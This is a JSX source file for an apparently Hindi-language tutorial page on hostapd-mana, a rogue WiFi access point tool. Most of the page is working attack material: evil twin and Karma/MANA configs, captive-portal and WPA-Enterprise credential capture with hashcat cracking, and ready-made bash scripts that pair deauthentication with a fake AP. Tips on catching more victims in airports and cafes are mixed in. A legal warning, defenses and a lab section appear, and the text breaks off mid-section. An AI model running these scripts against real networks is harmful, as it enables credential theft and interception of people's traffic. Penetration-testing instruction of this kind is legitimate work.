import TutorialLayout from '../../components/TutorialLayout'
import CodeBlock from '../../components/CodeBlock'

export default function HostapdMana() {
  return (
    <TutorialLayout
      title="hostapd-mana"
      subtitle="Evil twin access point — फेक वाईफाई हॉटस्पॉट बनाकर क्रेडेंशियल्स कैप्चर"
      icon="📡"
      prev={{ to: '/tool/pixiewps', label: 'pixiewps' }}
      next={{ to: '/tool/yersinia', label: 'yersinia' }}
    >
      <h2>What is Hostapd-mana?</h2>
      <p>
        hostapd-mana एक powerful rogue access point tool है जो evil twin WiFi networks बनाने के लिए इस्तेमाल होता है। यह hostapd (Linux WiFi access point daemon) का modified version है जिसमें MANA (Multiple Access Network Aggregation) attack features add किए गए हैं। यह Karma attacks, WPA-Enterprise credential harvesting, और wireless client exploitation के लिए industry-standard tool है।
      </p>
      <p>
        hostapd-mana को SensePost (Dominic White और Ian de Villiers) ने बनाया है — यह South Africa की知名 security consultancy है। यह C language में लिखा गया है और original hostapd codebase पर based है। MANA features 2014 में DEF CON 22 में present किए गए थे और तब से यह wireless penetration testing का essential tool बन गया है।
      </p>
      <p>
        Evil twin attack में attacker real WiFi network का exact copy बनाता है। जब victims fake AP से connect होते हैं, तो attacker उनका traffic intercept कर सकता है, credentials capture कर सकता है, और malicious redirects कर सकता है। hostapd-mana इस attack को automate और reliable बनाता है — especially Karma attacks जहाँ devices automatically connect हो जाते हैं।
      </p>
      <p>
        hostapd-mana का सबसे powerful feature है MANA attack — यह traditional Karma attack का improved version है। Modern devices probe request validation करते हैं, लेकिन MANA इस validation को bypass कर देता है। Multiple SSIDs को simultaneously serve करता है जिससे ज़्यादा victims connect होते हैं। यह tool Kali Linux में pre-installed आता है।
      </p>
      <p>
        hostapd-mana का इस्तेमाल red team operations, wireless security audits, और social engineering engagements में होता है। WPA-Enterprise credential capture इसका सबसे valuable feature है — corporate environments में domain credentials capture करने का सबसे effective तरीका है। Captive portal attacks से WiFi passwords, social media logins, और email credentials भी capture किए जा सकते हैं।
      </p>

      <div className="warning-box mb-6">
        <strong>⚠️ कानूनी चेतावनी:</strong> hostapd-mana केवल अधिकृत penetration testing और wireless security research में ही इस्तेमाल करें। Evil twin attacks, Karma attacks, और WiFi jamming बिना अनुमति के अवैध हैं। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत अनधिकृत wireless network access अपराध हो सकता है।
      </div>

      <h2>History of Hostapd-mana</h2>
      <p>
        hostapd-mana की शुरुआत 2014 में SensePost के researchers Dominic White और Ian de Villiers ने की थी। उन्होंने DEF CON 22 conference में "MANA" (Multiple Access Network Aggregation) technique present की — यह traditional Karma attack का improved version है। Karma attack पहले से exist करता था लेकिन modern devices ने probe request handling change कर दिया था। MANA ने इस limitation को overcome किया।
      </p>
      <p>
        hostapd (host access point daemon) Linux का standard WiFi AP software है। SensePost ने इसका fork लेकर MANA features add किए — probe request spoofing, loud mode, WPA-Enterprise credential capture, और client isolation bypass। यह tool Kali Linux में pre-installed आता है और wireless penetration testing का essential part है।
      </p>
      <p>
        2016 में SensePost ने "Lure10" attack present किया जो Windows 10 devices को automatically evil twin से connect कराता था। 2018 में WPA-Enterprise credential capture features add हुए। 2020 में hostapd-mana को actively maintain किया जा रहा है और new features add हो रहे हैं।
      </p>

      <h2>How Hostapd-mana Works?</h2>
      <p>
        hostapd-mana wireless interface को access point mode में convert करता है:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">Rogue AP Creation:</strong> WiFi adapter को AP mode में configure करता है — fake SSID broadcast करता है</li>
        <li><strong className="text-white">Probe Response Spoofing:</strong> Devices की probe requests का respond करता है — "हाँ, मैं वही network हूँ"</li>
        <li><strong className="text-white">MANA Aggregation:</strong> Multiple SSIDs को simultaneously serve करता है — ज़्यादा victims connect होते हैं</li>
        <li><strong className="text-white">Authentication Handling:</strong> Open, WPA-PSK, और WPA-EAP authentication support करता है</li>
        <li><strong className="text-white">Credential Capture:</strong> WPA-Enterprise में EAP credentials (username + password hash) capture करता है</li>
        <li><strong className="text-white">Client Isolation Bypass:</strong> Connected clients को एक-दूसरे से communicate करने देता है</li>
        <li><strong className="text-white">Captive Portal Support:</strong> HTTP/HTTPS redirect करके fake login page दिखा सकता है</li>
        <li><strong className="text-white">Multi-Channel Operation:</strong> Different channels पर operate कर सकता है</li>
        <li><strong className="text-white">Deauth Integration:</strong> aireplay-ng के साथ combine करके victims को force disconnect कर सकता है</li>
        <li><strong className="text-white">Logging:</strong> सभी connections और captured credentials को file में save करता है</li>
      </ul>

      <h2>Installation</h2>
      <p>
        hostapd-mana को कई तरीकों से install कर सकते हैं:
      </p>
      <CodeBlock
        title="hostapd-mana Installation"
        code={`# Kali Linux / Nethunter में pre-installed:
sudo apt update
sudo apt install hostapd-mana

# Source से build (latest features):
git clone https://github.com/sensepost/hostapd-mana.git
cd hostapd-mana
make
sudo make install

# Dependencies install:
sudo apt install libnl-3-dev libnl-genl-3-dev libssl-dev

# Version check:
hostapd-mana -v

# Interface support check (AP mode required):
iw list | grep -A 10 "Supported interface modes"
# "AP" mode दिखना चाहिए

# Docker से (experimental):
docker pull sensepost/hostapd-mana

# Nethunter पर:
# Kali Nethunter app install करो
# Terminal open करो
# hostapd-mana directly available है`}
      />

      <h2>Basic Usage</h2>
      <p>
        hostapd-mana का basic usage simple है — config file बनाओ और start करो:
      </p>
      <CodeBlock
        title="Basic Evil AP"
        code={`# hostapd.conf बनाएं:
interface=wlan1
driver=nl80211
ssid=FreeWiFi
hw_mode=g
channel=6
wpa=0

# Evil AP start करें:
sudo hostapd-mana hostapd.conf

# दो WiFi adapters चाहिए:
# wlan0 — internet connectivity
# wlan1 — evil AP (victim-facing)

# Interface support check:
iw list | grep -A 10 "Supported interface modes"
# "AP" mode दिखना चाहिए

# Monitor mode से AP mode में switch:
sudo ip link set wlan1 down
sudo iw wlan1 set type managed
sudo ip link set wlan1 up

# Status check:
iwconfig wlan1`}
      />

      <h2>Important Options</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Option</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">उदाहरण</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">mana=1</td><td className="py-2 px-3">MANA attack enable करें</td><td className="py-2 px-3 font-mono text-xs">mana=1</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">mana_loud=1</td><td className="py-2 px-3">सभी probe requests का respond करें</td><td className="py-2 px-3 font-mono text-xs">mana_loud=1</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">enable_mana=1</td><td className="py-2 px-3">MANA mode fully on</td><td className="py-2 px-3 font-mono text-xs">enable_mana=1</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">mana_credout=file</td><td className="py-2 px-3">Captured credentials output file</td><td className="py-2 px-3 font-mono text-xs">mana_credout=creds.txt</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">mana_eapsuccess=1</td><td className="py-2 px-3">EAP success response send करें</td><td className="py-2 px-3 font-mono text-xs">mana_eapsuccess=1</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">ssid=NetworkName</td><td className="py-2 px-3">Broadcast SSID name</td><td className="py-2 px-3 font-mono text-xs">ssid=FreeWiFi</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">channel=6</td><td className="py-2 px-3">WiFi channel (1-13)</td><td className="py-2 px-3 font-mono text-xs">channel=11</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">hw_mode=g</td><td className="py-2 px-3">Frequency mode</td><td className="py-2 px-3 font-mono text-xs">hw_mode=a (5GHz)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">wpa=0/2</td><td className="py-2 px-3">Authentication type</td><td className="py-2 px-3 font-mono text-xs">wpa=2</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">interface=wlan1</td><td className="py-2 px-3">WiFi interface name</td><td className="py-2 px-3 font-mono text-xs">interface=wlan1</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">driver=nl80211</td><td className="py-2 px-3">WiFi driver</td><td className="py-2 px-3 font-mono text-xs">driver=nl80211</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">wpa_key_mgmt</td><td className="py-2 px-3">Key management</td><td className="py-2 px-3 font-mono text-xs">WPA-EAP</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">eap_server=1</td><td className="py-2 px-3">Internal EAP server</td><td className="py-2 px-3 font-mono text-xs">eap_server=1</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">mana_ssid=Name</td><td className="py-2 px-3">Specific SSID for quiet mode</td><td className="py-2 px-3 font-mono text-xs">mana_ssid=CorpWiFi</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">logger_syslog=-1</td><td className="py-2 px-3">Logging level</td><td className="py-2 px-3 font-mono text-xs">logger_syslog=-1</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Rogue Access Point Setup</h2>
      <p>
        Evil twin attack के लिए complete setup:
      </p>
      <CodeBlock
        title="Complete Evil AP Setup"
        code={`# Step 1: Interface configure करें
sudo ip link set wlan1 down
sudo iw wlan1 set type managed
sudo ip link set wlan1 up

# Step 2: hostapd-mana.conf बनाएं
cat > /tmp/hostapd-mana.conf << EOF
interface=wlan1
driver=nl80211
ssid=TargetWiFi
hw_mode=g
channel=6
wpa=0
mana=1
mana_loud=1
enable_mana=1
mana_credout=/tmp/credentials.txt
logger_syslog=-1
logger_stdout=-1
EOF

# Step 3: DHCP server setup (dnsmasq.conf)
cat > /tmp/dnsmasq.conf << EOF
interface=wlan1
dhcp-range=192.168.10.10,192.168.10.50,12h
dhcp-option=3,192.168.10.1
dhcp-option=6,192.168.10.1
address=/#/192.168.10.1
EOF

# Step 4: IP address assign करें
sudo ip addr add 192.168.10.1/24 dev wlan1

# Step 5: Services start करें
sudo hostapd-mana /tmp/hostapd-mana.conf &
sudo dnsmasq -C /tmp/dnsmasq.conf &

# Step 6: IP forwarding enable करें
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Step 7: NAT rules add करें
sudo iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE
sudo iptables -A FORWARD -i wlan1 -o wlan0 -j ACCEPT`}
      />

      <h2>Karma Attack</h2>
      <p>
        Karma attack सबसे powerful technique है — devices automatically connect हो जाते हैं बिना user interaction के:
      </p>
      <CodeBlock
        title="Karma Attack Configuration"
        code={`# hostapd-mana.conf (Karma mode):
interface=wlan1
driver=nl80211
ssid=TargetWiFi
hw_mode=g
channel=6
mana=1
mana_loud=1
enable_mana=1

# Karma attack start करें:
sudo hostapd-mana hostapd-mana.conf

# क्या होता है:
# 1. Devices probe requests भेजते हैं — "क्या TargetWiFi यहाँ है?"
# 2. hostapd-mana respond करता है — "हाँ, मैं TargetWiFi हूँ"
# 3. Device auto-connect हो जाता है
# 4. mana_loud=1 से सभी probe requests का respond मिलता है

# Karma + Deauth combo (maximum effectiveness):
# Terminal 1: hostapd-mana start करो
sudo hostapd-mana hostapd-mana.conf

# Terminal 2: Deauth attack real AP पर
sudo aireplay-ng --deauth 10 -a [TARGET_BSSID] wlan0mon

# Result: Victims real AP से disconnect होंगे
# और evil twin से connect होंगे

# यह attack airports, cafes, hotels में बहुत effective है
# devices saved WiFi networks ढूंढते रहते हैं`}
      />

      <h2>MANA Attack (Improved Karma)</h2>
      <p>
        MANA traditional Karma attack का improved version है — modern devices के लिए designed:
      </p>
      <CodeBlock
        title="MANA Features"
        code={`# Traditional Karma की limitations:
# - Modern devices probe response validation करते हैं
# - SSID mismatch पर connect नहीं होते
# - PMF (Protected Management Frames) block करता है

# MANA (Multiple Access Network Aggregation):
# - Multiple SSIDs को simultaneously serve करता है
# - Client-side probe list leak exploit करता है
# - Probe response validation bypass करता है
# - Loud mode: सभी probe requests का respond
# - Quiet mode: सिर्फ specific SSIDs का respond

# Loud mode configuration (maximum victims):
interface=wlan1
driver=nl80211
ssid=FreeWiFi
hw_mode=g
channel=6
mana=1
mana_loud=1
enable_mana=1

# Quiet mode configuration (targeted attack):
interface=wlan1
driver=nl80211
ssid=CorpWiFi
hw_mode=g
channel=6
mana=1
mana_loud=0
mana_ssid=CorpWiFi
mana_ssid=CorpGuest
enable_mana=1

# MANA कैसे काम करता है:
# 1. Device saved networks probe करता है
# 2. MANA respond करता है — "मैं वही network हूँ"
# 3. Client validation bypass होता है
# 4. Device connect हो जाता है`}
      />

      <h2>SSID Cloaking</h2>
      <CodeBlock
        title="Hidden SSID Attack"
        code={`# Hidden SSID broadcast करें:
interface=wlan1
driver=nl80211
ssid=
hw_mode=g
channel=6
mana=1
mana_loud=1

# यह hidden network की तरह दिखता है
# लेकिन MANA probe requests का respond करता है
# Devices जो पहले connect हो चुके हैं, वो auto-connect होंगे

# Multiple hidden SSIDs:
interface=wlan1
driver=nl80211
ssid=HiddenNet1
hw_mode=g
channel=6
mana=1
mana_loud=1
enable_mana=1

# SSID rotation (advanced):
# Script से SSID dynamically change करो
# Har victim के लिए different SSID serve करो`}
      />

      <h2>Credential Harvesting (Evil Twin)</h2>
      <p>
        Evil twin attack से credentials capture करने का complete workflow:
      </p>
      <CodeBlock
        title="Captive Portal Credential Capture"
        code={`# Step 1: Evil AP start करें (hostapd-mana)
sudo hostapd-mana /tmp/hostapd-mana.conf &

# Step 2: DHCP server (dnsmasq.conf):
cat > /tmp/dnsmasq.conf << EOF
interface=wlan1
dhcp-range=192.168.10.10,192.168.10.50,12h
address=/#/192.168.10.1
dhcp-option=3,192.168.10.1
dhcp-option=6,192.168.10.1
EOF

# Step 3: dnsmasq start करें:
sudo dnsmasq -C /tmp/dnsmasq.conf

# Step 4: iptables rules:
sudo iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 80 -j DNAT --to-destination 192.168.10.1:80
sudo iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 443 -j DNAT --to-destination 192.168.10.1:443

# Step 5: Captive portal web server:
# PHP/Python से custom login page बनाएं
# Company जैसा दिखे — logo, colors match करें
# POST request handler से credentials capture करें

# Step 6: Victim connect करेगा → portal दिखेगा → credentials capture

# Captured credentials check करें:
cat /tmp/credentials.txt
cat /var/log/apache2/access.log`}
      />

      <h2>WPA Enterprise Attack</h2>
      <p>
        WPA-Enterprise credential capture hostapd-mana का सबसे valuable feature है:
      </p>
      <CodeBlock
        title="WPA-Enterprise Credential Capture"
        code={`# hostapd-mana.conf (Enterprise mode):
interface=wlan1
driver=nl80211
ssid=CorpWiFi
hw_mode=g
channel=6
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP TKIP
rsn_pairwise=CCMP
mana=1
mana_loud=1
enable_mana=1
mana_eapsuccess=1
mana_credout=/tmp/enterprise_creds.txt
eap_server=1
eap_user_file=/tmp/hostapd.eap_user
ca_cert=/etc/hostapd-mana/ca.pem
server_cert=/etc/hostapd-mana/server.pem
private_key=/etc/hostapd-mana/server.key

# EAP user file बनाएं (/tmp/hostapd.eap_user):
cat > /tmp/hostapd.eap_user << EOF
* PEAP,TTLS,TLS,FAST
"test" GTPWD "test"
EOF

# Certificates generate करें (self-signed):
openssl req -x509 -newkey rsa:2048 -keyout server.key -out server.pem -days 365 -nodes

# Start:
sudo hostapd-mana /tmp/hostapd-mana.conf

# Captured credentials check करें:
cat /tmp/enterprise_creds.txt
# Output: username:password_hash

# Hash crack करें:
hashcat -m 5500 /tmp/enterprise_creds.txt /usr/share/wordlists/rockyou.txt`}
      />

      <h2>Lure10 Attack</h2>
      <CodeBlock
        title="Lure10 Attack (Windows 10)"
        code={`# Lure10 attack Windows 10 devices को auto-connect कराता है:
# Windows 10 Known WiFi Networks list exploit करता है

# Step 1: WiFi probe requests capture करो
sudo airodump-ng wlan0mon

# Step 2: Target device की probe requests identify करो
# Windows 10 devices saved networks probe करते हैं

# Step 3: hostapd-mana से respond करो
# mana_loud=1 से सभी probe requests का respond मिलता है

# Step 4: Device automatically connect हो जाता है
# Windows 10 "Connect automatically" feature exploit होता है

# Complete Lure10 setup:
interface=wlan1
driver=nl80211
ssid=FreePublicWiFi
hw_mode=g
channel=1
mana=1
mana_loud=1
enable_mana=1

# Effectiveness:
# Airports: 90%+ devices saved networks probe करते हैं
# Cafes: 70%+ devices auto-connect try करते हैं
# Hotels: 80%+ devices hotel WiFi probe करते हैं`}
      />

      <h2>Hostapd-mana vs Other Tools</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">फ़ीचर</th>
              <th className="text-left py-2 px-3 text-neon-green">hostapd-mana</th>
              <th className="text-left py-2 px-3 text-neon-green">Fluxion</th>
              <th className="text-left py-2 px-3 text-neon-green">Wifiphisher</th>
              <th className="text-left py-2 px-3 text-neon-green">Airgeddon</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Karma/MANA Attack</td><td className="py-2 px-3">हाँ (best)</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">सीमित</td><td className="py-2 px-3">सीमित</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">WPA-Enterprise</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Evil Twin</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Automation Level</td><td className="py-2 px-3">Manual (config)</td><td className="py-2 px-3">Automated</td><td className="py-2 px-3">Automated</td><td className="py-2 px-3">Semi-auto</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Probe Spoofing</td><td className="py-2 px-3">हाँ (MANA)</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">सीमित</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Captive Portal</td><td className="py-2 px-3">Manual setup</td><td className="py-2 px-3">Built-in</td><td className="py-2 px-3">Built-in</td><td className="py-2 px-3">Built-in</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Complexity</td><td className="py-2 px-3">High</td><td className="py-2 px-3">Low</td><td className="py-2 px-3">Low</td><td className="py-2 px-3">Medium</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Stealth Level</td><td className="py-2 px-3">High</td><td className="py-2 px-3">Low</td><td className="py-2 px-3">Medium</td><td className="py-2 px-3">Medium</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Customization</td><td className="py-2 px-3">Full control</td><td className="py-2 px-3">Limited</td><td className="py-2 px-3">Medium</td><td className="py-2 px-3">Medium</td></tr>
            <tr><td className="py-2 px-3 text-white">Best For</td><td className="py-2 px-3">Red team, advanced</td><td className="py-2 px-3">Beginners</td><td className="py-2 px-3">Quick attacks</td><td className="py-2 px-3">All-in-one</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Scripting and Automation</h2>
      <CodeBlock
        title="Automated Evil Twin Script"
        code={`#!/bin/bash
# Evil Twin Automation Script
# Usage: ./evil_twin.sh <SSID> [channel]

TARGET_SSID=$1
CHANNEL=$2
INTERFACE="wlan1"
GATEWAY="wlan0"

if [ -z "$TARGET_SSID" ]; then
    echo "Usage: $0 <SSID> [channel]"
    echo "Example: $0 FreeWiFi 6"
    exit 1
fi

CHANNEL=$\{CHANNEL:-6}

echo "[*] Setting up Evil Twin for: $TARGET_SSID"
echo "[*] Channel: $CHANNEL"

# Step 1: Cleanup previous instances
sudo killall hostapd-mana 2>/dev/null
sudo killall dnsmasq 2>/dev/null
sudo ip addr flush dev $INTERFACE

# Step 2: Interface setup
echo "[*] Configuring interface..."
sudo ip link set $INTERFACE down
sudo iw $INTERFACE set type managed
sudo ip link set $INTERFACE up

# Step 3: hostapd-mana config
cat > /tmp/evil_ap.conf << EOF
interface=$INTERFACE
driver=nl80211
ssid=$TARGET_SSID
hw_mode=g
channel=$CHANNEL
wpa=0
mana=1
mana_loud=1
enable_mana=1
mana_credout=/tmp/evil_creds.txt
EOF

# Step 4: dnsmasq config
cat > /tmp/dnsmasq.conf << EOF
interface=$INTERFACE
dhcp-range=192.168.10.10,192.168.10.50,12h
address=/#/192.168.10.1
dhcp-option=3,192.168.10.1
dhcp-option=6,192.168.10.1
EOF

# Step 5: IP setup
sudo ip addr add 192.168.10.1/24 dev $INTERFACE

# Step 6: Start services
echo "[*] Starting Evil AP..."
sudo hostapd-mana /tmp/evil_ap.conf &
sleep 2

echo "[*] Starting DHCP server..."
sudo dnsmasq -C /tmp/dnsmasq.conf &

# Step 7: IP forwarding
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
sudo iptables -t nat -A POSTROUTING -o $GATEWAY -j MASQUERADE
sudo iptables -A FORWARD -i $INTERFACE -o $GATEWAY -j ACCEPT

echo "[*] Evil Twin running!"
echo "[*] Captured credentials: /tmp/evil_creds.txt"
echo "[*] Press Ctrl+C to stop"

# Wait for interrupt
trap "echo '[*] Stopping...'; sudo killall hostapd-mana; sudo killall dnsmasq; exit 0" INT TERM
wait`}
      />

      <CodeBlock
        title="Deauth + Evil Twin Combo Script"
        code={`#!/bin/bash
# Deauth + Evil Twin Combined Attack
# Usage: ./deauth_evil.sh <SSID> <TARGET_BSSID> [channel]

TARGET_SSID=$1
TARGET_BSSID=$2
CHANNEL=$3

if [ -z "$TARGET_BSSID" ]; then
    echo "Usage: $0 <SSID> <TARGET_BSSID> [channel]"
    exit 1
fi

CHANNEL=$\{CHANNEL:-6}

echo "[*] Attack: Deauth + Evil Twin"
echo "[*] Target SSID: $TARGET_SSID"
echo "[*] Target BSSID: $TARGET_BSSID"

# Step 1: Evil Twin start करो
./evil_twin.sh "$TARGET_SSID" "$CHANNEL" &
sleep 3

# Step 2: Deauth attack real AP पर
echo "[*] Starting deauth attack..."
sudo aireplay-ng --deauth 0 -a $TARGET_BSSID wlan0mon

# Victims disconnect होंगे और evil twin से connect होंगे`}
      />

      <CodeBlock
        title="WPA-Enterprise Credential Capture Script"
        code={`#!/bin/bash
# WPA-Enterprise Evil AP Script
# Usage: ./enterprise_evil.sh <SSID>

TARGET_SSID=$1

if [ -z "$TARGET_SSID" ]; then
    echo "Usage: $0 <SSID>"
    exit 1
fi

echo "[*] Setting up WPA-Enterprise Evil AP: $TARGET_SSID"

# Step 1: Generate certificates
echo "[*] Generating certificates..."
openssl req -x509 -newkey rsa:2048 -keyout /tmp/server.key -out /tmp/server.pem -days 365 -nodes -subj "/CN=EvilAP"

# Step 2: EAP user file
cat > /tmp/hostapd.eap_user << EOF
* PEAP,TTLS,TLS,FAST
"test" GTPWD "test"
EOF

# Step 3: hostapd-mana config
cat > /tmp/enterprise_ap.conf << EOF
interface=wlan1
driver=nl80211
ssid=$TARGET_SSID
hw_mode=g
channel=6
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP TKIP
rsn_pairwise=CCMP
mana=1
mana_loud=1
enable_mana=1
mana_eapsuccess=1
mana_credout=/tmp/enterprise_creds.txt
eap_server=1
eap_user_file=/tmp/hostapd.eap_user
ca_cert=/tmp/server.pem
server_cert=/tmp/server.pem
private_key=/tmp/server.key
EOF

# Step 4: Start
echo "[*] Starting WPA-Enterprise Evil AP..."
sudo hostapd-mana /tmp/enterprise_ap.conf

echo "[*] Captured credentials: /tmp/enterprise_creds.txt"`}
      />

      <h2>Common Problems and Solutions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'AP mode support नहीं है interface में', a: 'iw list | grep -A 10 "Supported interface modes" — "AP" दिखना चाहिए। Built-in WiFi chips AP mode support नहीं करते। External USB adapter (Alfa AWUS036ACH/ACM) use करो।' },
          { q: 'कोई device connect नहीं हो रहा', a: 'mana_loud=1 set करो — सभी probe requests का respond मिलेगा। Signal strength target AP से ज़्यादा होनी चाहिए। Channel match करो target AP से। Deauth attack भी चलाओ: aireplay-ng --deauth 0 -a BSSID wlan0mon' },
          { q: 'DHCP working नहीं कर रहा', a: 'sudo ip addr add 192.168.10.1/24 dev wlan1 — interface को IP assign करो। dnsmasq -C dnsmasq.conf — DHCP server start करो। iptables rules check करो।' },
          { q: 'WPA-Enterprise credentials capture नहीं हो रहे', a: 'mana_eapsuccess=1 set करो। eap_user_file और certificates correctly configure करो। mana_credout=credentials.txt — output file specify करो। Self-signed certificates use करो।' },
          { q: 'विक्टिम्स को internet नहीं मिल रहा', a: 'iptables NAT rules add करो: sudo iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE। IP forwarding enable करो: echo 1 > /proc/sys/net/ipv4/ip_forward।' },
          { q: 'hostapd-mana crash हो रहा है', a: 'Interface down करके दोबारा try करो: sudo ip link set wlan1 down। Driver issue हो सकता है — external adapter use करो। Config file syntax check करो।' },
          { q: 'Channel conflict आ रहा है', a: 'Target AP का channel match करो: airodump-ng wlan0mon से channel identify करो। hw_mode भी check करो — g=2.4GHz, a=5GHz।' },
          { q: 'Clients disconnect हो रहे हैं', a: 'Signal strength check करो — evil AP का signal target AP से ज़्यादा होना चाहिए। Channel congestion check करो — crowded channel avoid करो।' },
          { q: 'Captive portal load नहीं हो रहा', a: 'iptables PREROUTING rules check करो। Web server (Apache/Nginx) running होना चाहिए। DNS redirect working check करो: nslookup test.com → 192.168.10.1' },
          { q: '5GHz networks काम नहीं कर रहे', a: 'hw_mode=a set करो और 5GHz channel specify करो (36, 40, 44, 48, etc.)। Adapter 5GHz support करना चाहिए — सभी adapters support नहीं करते।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Detection and Defense</h2>
      <p>
        Evil twin attacks से कैसे बचें:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">Auto-Connect Disable:</strong> Device settings में auto-connect band करो — saved networks automatically connect नहीं होंगे</li>
        <li><strong className="text-white">Saved Networks Clean:</strong> Purane saved WiFi networks delete करो — जिनकी ज़रूरत नहीं</li>
        <li><strong className="text-white">WIDS/WIPS Deploy:</strong> Corporate में wireless IDS/IPS implement करो — rogue AP detect होगा</li>
        <li><strong className="text-white">802.11w (PMF):</strong> Protected Management Frames enable करो — deauth attacks block होंगे</li>
        <li><strong className="text-white">VPN Always:</strong> Public WiFi पर हमेशा VPN use करो — traffic encrypted रहेगा</li>
        <li><strong className="text-white">Certificate Pinning:</strong> SSL certificate errors को seriously लो — evil twin MITM detect हो सकता है</li>
        <li><strong className="text-white">HTTPS Only:</strong> सिर्फ HTTPS websites use करो — HTTP traffic interceptable है</li>
        <li><strong className="text-white">RF Monitoring:</strong> Wireless spectrum monitor करो — rogue APs detect करने के लिए</li>
        <li><strong className="text-white">Network Verification:</strong> WiFi connect करने से पहले BSSID verify करो — same SSID multiple BSSIDs हो सकते हैं</li>
        <li><strong className="text-white">EAP-TLS Use:</strong> WPA-Enterprise में EAP-TLS (certificate-based) use करो — PEAP/TTLS vulnerable हैं</li>
        <li><strong className="text-white">Rogue AP Detection Tools:</strong> Kismet, WiFiGuard, या commercial WIDS use करो</li>
        <li><strong className="text-white">Physical Security:</strong> Office premises में unauthorized WiFi devices detect करो</li>
      </ul>

      <h2>Lab Environment Setup</h2>
      <p>
        Evil twin attacks practice के लिए safe lab setup:
      </p>
      <CodeBlock
        title="Practice Lab Setup"
        code={`# Hardware requirements:
# - 2 WiFi adapters (ek internet, ek AP)
# - External USB WiFi adapter (Alfa recommended)
# - Target device (phone/laptop)
# - Router (for legitimate AP)

# Recommended adapters:
# - Alfa AWUS036ACH (dual-band, AP mode support)
# - Alfa AWUS036ACM (monitor mode + AP mode)
# - TP-Link TL-WN722N v1 (budget option)

# VirtualBox/VMware में Kali Linux:
# - USB WiFi adapter pass-through करो
# - Internal adapter NAT/Host-only पर रखो

# Lab setup steps:
# 1. Kali VM में WiFi adapter connect करो
# 2. hostapd-mana install करो
# 3. Evil AP configure करो
# 4. Target device से test करो

# Practice scenarios:
# 1. Open evil twin (no password)
# 2. WPA-PSK evil twin (fake password)
# 3. Karma attack (probe response)
# 4. WPA-Enterprise credential capture
# 5. Captive portal phishing

# Safe practice rules:
# केवल अपने lab में करें
# Real networks पर कभी न करें
# सब कुछ document करो
# Target device अपना होना चाहिए`}
      />

      <h2>Advanced Techniques</h2>
      <CodeBlock
        title="Advanced Attacks"
        code={`# 1. CursedWifi (MITM + Evil Twin):
# hostapd-mana + mitmproxy combination
# HTTPS traffic intercept करो evil twin से
# mitmproxy --mode transparent --listen-port 8080
# iptables rules से traffic redirect करो

# 2. KARMA + Deauth Combo:
# Terminal 1: hostapd-mana (Karma) start करो
sudo hostapd-mana hostapd-mana.conf
# Terminal 2: Deauth attack real AP पर
sudo aireplay-ng --deauth 0 -a TARGET_BSSID wlan0mon
# Result: Victims evil AP से connect होंगे

# 3. Multiple SSID Serving:
